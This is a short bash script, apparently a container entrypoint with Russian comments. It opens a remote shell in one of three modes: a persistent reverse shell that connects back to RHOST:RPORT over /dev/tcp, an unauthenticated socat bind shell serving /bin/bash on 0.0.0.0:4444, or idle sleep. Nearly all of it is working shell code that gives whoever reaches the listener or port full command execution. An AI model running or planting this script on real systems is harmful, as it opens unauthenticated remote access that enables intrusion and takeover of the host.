#!/usr/bin/env bash
set -u

BIND_PORT="${BIND_PORT:-4444}"

if [[ -n "${RHOST:-}" && -n "${RPORT:-}" ]]; then
  # Reverse shell: контейнер сам цепляется к листенеру (nc -lvnp $RPORT на приёмной стороне)
  echo "[*] reverse shell -> ${RHOST}:${RPORT} (retry loop)"
  while true; do
    bash -i >& "/dev/tcp/${RHOST}/${RPORT}" 0>&1
    sleep 5
  done
elif [[ -n "${BIND_PORT}" && "${BIND_PORT}" != "0" ]]; then
  # Bind shell: слушаем порт, снаружи подключаемся `nc <host> ${BIND_PORT}`
  echo "[*] bind shell (socat, pty) on 0.0.0.0:${BIND_PORT}"
  exec socat "TCP-LISTEN:${BIND_PORT},reuseaddr,fork" EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
else
  # Idle: shell через веб-терминал Coolify (Execute Command)
  echo "[*] idle mode: sleep infinity"
  exec sleep infinity
fi
